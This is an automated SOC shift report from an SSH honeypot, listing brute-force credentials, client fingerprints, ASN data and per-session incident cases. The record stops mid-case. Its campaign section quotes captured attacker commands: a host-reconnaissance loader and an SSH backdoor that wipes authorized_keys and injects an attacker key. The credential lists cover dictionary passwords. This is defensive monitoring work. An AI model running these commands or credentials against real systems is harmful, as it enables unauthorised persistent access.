# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-10 |
| **Generated At** | 2026-09-10T22:22:25Z |
| **Shift Time** | 22:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **192** |
| Confirmed Threats | **181** |
| False Positives Filtered | **11** (5.7%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **18** |
| High Severity Cases | **152** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **40** |
| Malware Samples Analyzed | **4** HIGH · **21** MED · 18 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **161** |
| Unique Credential Pairs | **138** |
| Unique Usernames | **34** |
| Unique Passwords | **95** |
| Successful Auth Pairs | **152** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `admin` | 22 |
| `support` | 10 |
| `345gs5662d34` | 8 |
| `duyu` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 10 |
| `345gs5662d34` | 8 |
| `3245gs5662d34` | 7 |
| `admin` | 5 |
| `12345678` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 10 |
| `345gs5662d34` | `345gs5662d34` | 8 |
| `root` | `LeitboGi0ro` | 3 |
| `admin` | `Admin@1234` | 3 |
| `root` | `alpine` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `yanfeng` | `admin` | `109.160.32.64` | 2026-09-10T18:55:04 |
| `bseo` | `P@ssw0rd` | `109.160.32.64` | 2026-09-10T18:55:10 |
| `fanyichao` | `fanyichao@1234` | `109.160.32.64` | 2026-09-10T18:55:16 |
| `duyu` | `duyu12345` | `109.160.32.64` | 2026-09-10T18:55:26 |
| `wangshunyi` | `12345678` | `109.160.32.64` | 2026-09-10T18:55:29 |
| `mteg_vas` | `12345678` | `109.160.32.64` | 2026-09-10T18:55:36 |
| `mteg_vas` | `mteg_vas1234` | `109.160.32.64` | 2026-09-10T18:55:43 |
| `yanfeng` | `@yanfeng123` | `109.160.32.64` | 2026-09-10T18:55:50 |
| `jenkins` | `1qaz2wsx3edc4rfv` | `109.160.32.64` | 2026-09-10T18:55:57 |
| `bseo` | `bseo123` | `109.160.32.64` | 2026-09-10T18:56:02 |
| `root` | `schweden` | `109.160.32.64` | 2026-09-10T18:56:06 |
| `kiazoldyck` | `kiazoldyck123` | `109.160.32.64` | 2026-09-10T18:56:11 |
| `shenjiacheng` | `1234` | `109.160.32.64` | 2026-09-10T18:56:16 |
| `kiazoldyck` | `abc@123` | `109.160.32.64` | 2026-09-10T18:56:22 |
| `yuanye` | `yuanye@1234` | `109.160.32.64` | 2026-09-10T18:56:26 |
| `yuanye` | `12345678` | `109.160.32.64` | 2026-09-10T18:56:33 |
| `yuanye` | `12345` | `109.160.32.64` | 2026-09-10T18:56:39 |
| `duyu` | `admin` | `109.160.32.64` | 2026-09-10T18:56:44 |
| `root` | `QAZwsx!@#` | `109.160.32.64` | 2026-09-10T18:56:49 |
| `nisan` | `nisan123` | `109.160.32.64` | 2026-09-10T18:56:55 |
| `yanfeng` | `123456789` | `109.160.32.64` | 2026-09-10T18:57:00 |
| `mteg_vas` | `123456` | `109.160.32.64` | 2026-09-10T18:57:06 |
| `mteg_vas` | `ubuntu` | `109.160.32.64` | 2026-09-10T18:57:12 |
| `bseo` | `bseo123456` | `109.160.32.64` | 2026-09-10T18:57:17 |
| `root` | `Qazwsx@111` | `109.160.32.64` | 2026-09-10T18:57:24 |
| `nisan` | `nisan@1234` | `109.160.32.64` | 2026-09-10T18:57:29 |
| `mteg_vas` | `root` | `109.160.32.64` | 2026-09-10T18:57:35 |
| `qufeng` | `123456789` | `109.160.32.64` | 2026-09-10T18:57:41 |
| `root` | `root1` | `80.94.92.179` | 2026-09-10T18:57:46 |
| `tiaoban` | `tiaoban@123` | `109.160.32.64` | 2026-09-10T18:57:47 |
| `nisan` | `nisan@12345` | `109.160.32.64` | 2026-09-10T18:57:52 |
| `root` | `QAZedc13564516993` | `109.160.32.64` | 2026-09-10T18:57:57 |
| `shenjiacheng` | `shenjiacheng1` | `109.160.32.64` | 2026-09-10T18:58:03 |
| `duyu` | `12345` | `109.160.32.64` | 2026-09-10T18:58:09 |
| `duyu` | `duyu` | `109.160.32.64` | 2026-09-10T18:58:16 |
| `kiazoldyck` | `kiazoldyck123456` | `109.160.32.64` | 2026-09-10T18:58:23 |
| `fanyichao` | `123456789` | `109.160.32.64` | 2026-09-10T18:58:30 |
| `yuanye` | `P@ssw0rd!` | `109.160.32.64` | 2026-09-10T18:58:37 |
| `duyu` | `ubuntu` | `109.160.32.64` | 2026-09-10T18:58:43 |
| `duyu` | `duyu1` | `109.160.32.64` | 2026-09-10T18:58:49 |
| `kiazoldyck` | `1234` | `109.160.32.64` | 2026-09-10T18:58:56 |
| `nisan` | `P@ssw0rd!` | `109.160.32.64` | 2026-09-10T18:59:04 |
| `yangxiang` | `yangxiang123` | `109.160.32.64` | 2026-09-10T18:59:11 |
| `fanyichao` | `@fanyichao123` | `109.160.32.64` | 2026-09-10T18:59:17 |
| `jkim` | `jkim` | `109.160.32.64` | 2026-09-10T18:59:24 |
| `yangxiang` | `yangxiang12` | `109.160.32.64` | 2026-09-10T18:59:32 |
| `duyu` | `12345678` | `109.160.32.64` | 2026-09-10T18:59:40 |
| `nisan` | `1234` | `109.160.32.64` | 2026-09-10T18:59:44 |
| `root` | `root12` | `80.94.92.179` | 2026-09-10T18:59:48 |
| `yscho` | `yscho` | `109.160.32.64` | 2026-09-10T18:59:51 |
| `yscho` | `1234567890` | `109.160.32.64` | 2026-09-10T18:59:56 |
| `tiaoban` | `1234567890` | `109.160.32.64` | 2026-09-10T19:00:01 |
| `kiazoldyck` | `123456789` | `109.160.32.64` | 2026-09-10T19:00:09 |
| `root` | `137900` | `109.160.32.64` | 2026-09-10T19:00:17 |
| `wangshunyi` | `wangshunyi12345` | `109.160.32.64` | 2026-09-10T19:00:24 |
| `yuanye` | `Admin@123` | `109.160.32.64` | 2026-09-10T19:00:32 |
| `mteg_vas` | `mteg_vas1` | `109.160.32.64` | 2026-09-10T19:00:38 |
| `yscho` | `root` | `109.160.32.64` | 2026-09-10T19:00:48 |
| `yscho` | `ubuntu` | `109.160.32.64` | 2026-09-10T19:00:57 |
| `kiazoldyck` | `kiazoldyck1` | `109.160.32.64` | 2026-09-10T19:01:01 |
| `shenjiacheng` | `admin` | `109.160.32.64` | 2026-09-10T19:01:08 |
| `kiazoldyck` | `kiazoldyck12` | `109.160.32.64` | 2026-09-10T19:01:15 |
| `yscho` | `yscho123456` | `109.160.32.64` | 2026-09-10T19:01:21 |
| `fanyichao` | `fanyichao` | `109.160.32.64` | 2026-09-10T19:01:29 |
| `yangtiancheng` | `12345678` | `109.160.32.64` | 2026-09-10T19:01:37 |
| `yanfeng` | `1qaz@WSX` | `109.160.32.64` | 2026-09-10T19:01:44 |
| `root` | `Hys123456` | `109.160.32.64` | 2026-09-10T19:01:50 |
| `root` | `root123` | `80.94.92.179` | 2026-09-10T19:01:54 |
| `yangtiancheng` | `12345` | `109.160.32.64` | 2026-09-10T19:01:58 |
| `yangtiancheng` | `yangtiancheng@123` | `109.160.32.64` | 2026-09-10T19:02:05 |
| `yscho` | `yscho12` | `109.160.32.64` | 2026-09-10T19:02:12 |
| `bseo` | `bseo@123` | `109.160.32.64` | 2026-09-10T19:02:21 |
| `bseo` | `admin` | `109.160.32.64` | 2026-09-10T19:02:30 |
| `yanfeng` | `Admin@123` | `109.160.32.64` | 2026-09-10T19:02:37 |
| `bseo` | `bseo@1234` | `109.160.32.64` | 2026-09-10T19:02:43 |
| `root` | `root2026` | `80.94.92.179` | 2026-09-10T19:03:55 |
| `admin` | `P@ssW0rd!` | `114.111.54.189` | 2026-09-10T19:04:05 |
| `345gs5662d34` | `345gs5662d34` | `114.111.54.189` | 2026-09-10T19:04:09 |
| `admin` | `3245gs5662d34` | `114.111.54.189` | 2026-09-10T19:04:10 |
| `marty` | `marty` | `103.200.23.107` | 2026-09-10T19:04:24 |
| `345gs5662d34` | `345gs5662d34` | `103.200.23.107` | 2026-09-10T19:04:29 |
| `marty` | `3245gs5662d34` | `103.200.23.107` | 2026-09-10T19:04:31 |
| `root` | `welcome` | `80.94.92.179` | 2026-09-10T19:06:07 |
| `ubuntu` | `2233` | `217.60.255.130` | 2026-09-10T19:07:01 |
| `adam` | `adam` | `37.32.22.70` | 2026-09-10T19:08:31 |
| `345gs5662d34` | `345gs5662d34` | `37.32.22.70` | 2026-09-10T19:08:36 |
| `adam` | `3245gs5662d34` | `37.32.22.70` | 2026-09-10T19:08:38 |
| `admin` | `123456` | `80.94.92.179` | 2026-09-10T19:08:49 |
| `support` | `support` | `10.0.0.73` | 2026-09-10T19:09:10 |
| `admin` | `123qwe` | `80.94.92.179` | 2026-09-10T19:11:29 |
| `admin` | `123qwerty` | `80.94.92.179` | 2026-09-10T19:13:32 |
| `admin` | `21` | `80.94.92.179` | 2026-09-10T19:15:34 |
| `admin` | `321` | `80.94.92.179` | 2026-09-10T19:17:25 |
| `admin` | `654321` | `80.94.92.179` | 2026-09-10T19:19:35 |
| `admin` | `P@ssw0rd` | `80.94.92.179` | 2026-09-10T19:22:23 |
| `admin` | `Password` | `80.94.92.179` | 2026-09-10T19:25:06 |
| `admin` | `admin` | `80.94.92.179` | 2026-09-10T19:27:04 |
| `admin` | `admin12` | `80.94.92.179` | 2026-09-10T19:28:56 |
| `admin` | `admin123` | `80.94.92.179` | 2026-09-10T19:30:52 |
| `admin` | `admin2026` | `80.94.92.179` | 2026-09-10T19:32:55 |
| `admin` | `letmein` | `80.94.92.179` | 2026-09-10T19:34:50 |
| `admin` | `pa$w0rd` | `80.94.92.179` | 2026-09-10T19:36:58 |
| `admin` | `passw0rd` | `80.94.92.179` | 2026-09-10T19:39:36 |
| `root` | `------fuck------` | `10.0.0.73` | 2026-09-10T19:40:34 |
| `admin` | `password` | `80.94.92.179` | 2026-09-10T19:42:44 |
| `farid` | `farid` | `218.78.128.136` | 2026-09-10T19:43:02 |
| `345gs5662d34` | `345gs5662d34` | `218.78.128.136` | 2026-09-10T19:43:06 |
| `farid` | `3245gs5662d34` | `218.78.128.136` | 2026-09-10T19:43:08 |
| `admin` | `qwerty` | `80.94.92.179` | 2026-09-10T19:44:50 |
| `tom` | `12345` | `5.188.3.243` | 2026-09-10T19:44:56 |
| `345gs5662d34` | `345gs5662d34` | `5.188.3.243` | 2026-09-10T19:45:00 |
| `tom` | `3245gs5662d34` | `5.188.3.243` | 2026-09-10T19:45:01 |
| `administrator` | `123456` | `80.94.92.179` | 2026-09-10T19:46:46 |
| `root` | `1234@Abc` | `103.241.43.193` | 2026-09-10T19:47:07 |
| `345gs5662d34` | `345gs5662d34` | `103.241.43.193` | 2026-09-10T19:47:11 |
| `root` | `3245gs5662d34` | `103.241.43.193` | 2026-09-10T19:47:13 |
| `administrator` | `P@ssw0rd` | `80.94.92.179` | 2026-09-10T19:48:32 |
| `support` | `support` | `176.53.159.196` | 2026-09-10T19:48:53 |
| `support` | `support` | `138.226.239.234` | 2026-09-10T19:48:55 |
| `administrator` | `administrator` | `80.94.92.179` | 2026-09-10T19:50:23 |
| `support` | `support` | `77.90.185.17` | 2026-09-10T19:50:32 |
| `administrator` | `administrator123` | `80.94.92.179` | 2026-09-10T19:52:20 |
| `administrator` | `passw0rd` | `80.94.92.179` | 2026-09-10T19:54:13 |
| `administrator` | `password` | `80.94.92.179` | 2026-09-10T19:55:57 |
| `ansible` | `123456` | `80.94.92.179` | 2026-09-10T19:57:46 |
| `root` | `123@@@` | `165.1.75.106` | 2026-09-10T19:58:58 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-09-10T19:59:02 |
| `ansible` | `ansible` | `80.94.92.179` | 2026-09-10T19:59:39 |
| `ansible` | `ansible123` | `80.94.92.179` | 2026-09-10T20:01:34 |
| `ansible` | `passw0rd` | `80.94.92.179` | 2026-09-10T20:03:41 |
| `ansible` | `password` | `80.94.92.179` | 2026-09-10T20:05:57 |
| `apache` | `P@ssw0rd` | `80.94.92.179` | 2026-09-10T20:08:25 |
| `support` | `support` | `80.94.95.116` | 2026-09-10T20:10:44 |
| `apache` | `apache` | `80.94.92.179` | 2026-09-10T20:11:16 |
| `apache` | `password` | `80.94.92.179` | 2026-09-10T20:13:18 |
| `backup` | `123qwe` | `80.94.92.179` | 2026-09-10T20:15:12 |
| `backup` | `54321` | `80.94.92.179` | 2026-09-10T20:17:04 |
| `backup` | `backup` | `80.94.92.179` | 2026-09-10T20:19:08 |
| `admin` | `Admin@1234` | `138.226.239.233` | 2026-09-10T20:23:37 |
| `admin` | `Admin@1234` | `138.226.239.234` | 2026-09-10T20:24:13 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-10T20:29:18 |
| `admin` | `Admin@1234` | `10.0.0.73` | 2026-09-10T20:29:38 |
| `uucp` | `uucp` | `138.226.239.233` | 2026-09-10T20:33:05 |
| `username` | `password` | `138.226.239.233` | 2026-09-10T20:38:26 |
| `root` | `alpine` | `80.94.95.116` | 2026-09-10T20:42:48 |
| `root` | `alpine` | `10.0.0.73` | 2026-09-10T20:47:48 |
| `ubuntu` | `4321` | `217.60.255.130` | 2026-09-10T20:50:18 |
| `federico` | `federico` | `14.103.107.221` | 2026-09-10T20:54:04 |
| `345gs5662d34` | `345gs5662d34` | `14.103.107.221` | 2026-09-10T20:54:09 |
| `chris` | `123456` | `201.76.120.30` | 2026-09-10T20:54:45 |
| `345gs5662d34` | `345gs5662d34` | `201.76.120.30` | 2026-09-10T20:54:48 |
| `chris` | `3245gs5662d34` | `201.76.120.30` | 2026-09-10T20:54:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **192** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 114 |
| libssh | 33 |
| OpenSSH | 9 |
| Paramiko (Python) | 4 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 71 | 1 |
| `2ec37a7cc8da...` | Mirai/variant | 40 | 1 |
| `f555226df196...` | Mirai/variant | 19 | 7 |
| `1f2f2f9b0a73...` | Mirai/variant | 6 | 3 |
| `03a80b21afa8...` | Modern SSH client | 5 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 71 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 40 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 19 | 7 | Mirai/variant |
| `1f2f2f9b0a73...` | libssh | 6 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 2 | Modern SSH client |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `390ffe68a68c...` | OpenSSH | 4 | 3 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 39 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 8 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.200.23.107`, `103.241.43.193`, `218.78.128.136`, `37.32.22.70`, `5.188.3.243`, `14.103.107.221`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **24** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 16 | HIGH |
| `AS57269` | DIGI SPAIN TELECOM S.A | 1 | LOW |
| `AS4134` | CHINANET BACKBONE | 1 | MEDIUM |
| `AS4812` | China Telecom (Group) | 1 | HIGH |
| `AS3215` | Orange S.A. | 1 | HIGH |
| `AS9988` | Myanma Posts and Telecommunications | 1 | MEDIUM |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS272066` | FIBRAZUL INTERNET S.R.L. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (152)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-71934c25d7fe

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:04` | `cowrie.login.success` |
| `2026-09-10 18:55:06` | `cowrie.session.params` |
| `2026-09-10 18:55:06` | `cowrie.command.input` |
| `2026-09-10 18:55:07` | `cowrie.log.closed` |
| `2026-09-10 18:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c4cafd3808

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:08` | `cowrie.session.connect` |
| `2026-09-10 18:55:08` | `cowrie.client.version` |
| `2026-09-10 18:55:08` | `cowrie.client.kex` |
| `2026-09-10 18:55:10` | `cowrie.login.success` |
| `2026-09-10 18:55:11` | `cowrie.session.params` |
| `2026-09-10 18:55:11` | `cowrie.command.input` |
| `2026-09-10 18:55:12` | `cowrie.log.closed` |
| `2026-09-10 18:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0dd983aac5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:15` | `cowrie.session.connect` |
| `2026-09-10 18:55:15` | `cowrie.client.version` |
| `2026-09-10 18:55:15` | `cowrie.client.kex` |
| `2026-09-10 18:55:16` | `cowrie.login.success` |
| `2026-09-10 18:55:17` | `cowrie.session.params` |
| `2026-09-10 18:55:17` | `cowrie.command.input` |
| `2026-09-10 18:55:17` | `cowrie.log.closed` |
| `2026-09-10 18:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7a0b4b805f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:22` | `cowrie.session.connect` |
| `2026-09-10 18:55:23` | `cowrie.client.version` |
| `2026-09-10 18:55:23` | `cowrie.client.kex` |
| `2026-09-10 18:55:26` | `cowrie.login.success` |
| `2026-09-10 18:55:28` | `cowrie.session.params` |
| `2026-09-10 18:55:28` | `cowrie.command.input` |
| `2026-09-10 18:55:28` | `cowrie.log.closed` |
| `2026-09-10 18:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1adffb7e7a08

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:28` | `cowrie.session.connect` |
| `2026-09-10 18:55:28` | `cowrie.client.version` |
| `2026-09-10 18:55:28` | `cowrie.client.kex` |
| `2026-09-10 18:55:29` | `cowrie.login.success` |
| `2026-09-10 18:55:31` | `cowrie.session.params` |
| `2026-09-10 18:55:31` | `cowrie.command.input` |
| `2026-09-10 18:55:32` | `cowrie.log.closed` |
| `2026-09-10 18:55:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc774c0b97dd

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:34` | `cowrie.session.connect` |
| `2026-09-10 18:55:34` | `cowrie.client.version` |
| `2026-09-10 18:55:34` | `cowrie.client.kex` |
| `2026-09-10 18:55:36` | `cowrie.login.success` |
| `2026-09-10 18:55:38` | `cowrie.session.params` |
| `2026-09-10 18:55:38` | `cowrie.command.input` |
| `2026-09-10 18:55:38` | `cowrie.log.closed` |
| `2026-09-10 18:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b675e8bbb6ae

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:40` | `cowrie.session.connect` |
| `2026-09-10 18:55:40` | `cowrie.client.version` |
| `2026-09-10 18:55:40` | `cowrie.client.kex` |
| `2026-09-10 18:55:43` | `cowrie.login.success` |
| `2026-09-10 18:55:46` | `cowrie.session.params` |
| `2026-09-10 18:55:46` | `cowrie.command.input` |
| `2026-09-10 18:55:47` | `cowrie.log.closed` |
| `2026-09-10 18:55:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87157851ec88

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:47` | `cowrie.session.connect` |
| `2026-09-10 18:55:47` | `cowrie.client.version` |
| `2026-09-10 18:55:47` | `cowrie.client.kex` |
| `2026-09-10 18:55:50` | `cowrie.login.success` |
| `2026-09-10 18:55:52` | `cowrie.session.params` |
| `2026-09-10 18:55:52` | `cowrie.command.input` |
| `2026-09-10 18:55:53` | `cowrie.log.closed` |
| `2026-09-10 18:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e101c34f617f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 18:55:53` | `cowrie.session.connect` |
| `2026-09-10 18:55:53` | `cowrie.client.version` |
| `2026-09-10 18:55:53` | `cowrie.client.kex` |
| `2026-09-10 18:55:57` | `cowrie.login.success` |
| `2026-09-10 18:55:59` | `cowrie.session.params` |
| `2026-09-10 18:55:59` | `cowrie.command.input` |
| `2026-09-10 18:55:59` | `cowrie.log.closed` |
| `2026-09-10 18:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]64` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-209c3f5c57b3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]64` |
| **First Seen** | 2026-09-10 18:55 |
| **Last Seen** | 2026-09-10 18:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
